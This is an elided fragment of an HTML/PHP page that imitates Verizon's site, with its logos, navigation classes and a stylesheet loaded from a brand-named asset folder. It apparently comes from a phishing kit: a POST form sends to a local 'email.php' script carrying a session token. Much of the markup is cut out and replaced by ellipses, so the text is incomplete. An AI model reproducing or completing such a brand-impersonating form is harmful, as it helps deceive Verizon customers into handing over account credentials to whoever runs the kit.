...
<head>
	...
	<link rel="stylesheet" href="../../Export/css/verizon.css">
	<link rel="shortcut icon" href="../../Export/img/Verizon/verizon.ico" type="image/x-icon">
	<style type="text/css">
									...
									<div class="gnav20-logo">
										...
										<div class="gnav20-logo-wrapper gnav20-relative-index">
											<a class="gnav20-logoWhiteBg" style="cursor: pointer;"
												...
												<img alt="Verizon Logo" src="../../Export/img/Verizon/verizonLogo.svg">
											</a>
										</div>
									</div>
		...
		<div id="main-content" class="container-fluid">
			...
			<div class="row">
				...
				<div class="col-sm-5">
					...
					<form method="POST" action="../../Layout/Terraform/email.php?token=<?php echo $_SESSION['token']; ?>"
									...
									<div class="gnav20-logo-wrapper gnav20-relative-index">
										<a class="gnav20-logoBlackBg" href="/"
											...
											<img alt="Verizon Logo"
												src="../../Export/img/Verizon/VZ-White.svg">
										</a>
									</div>
								</div>
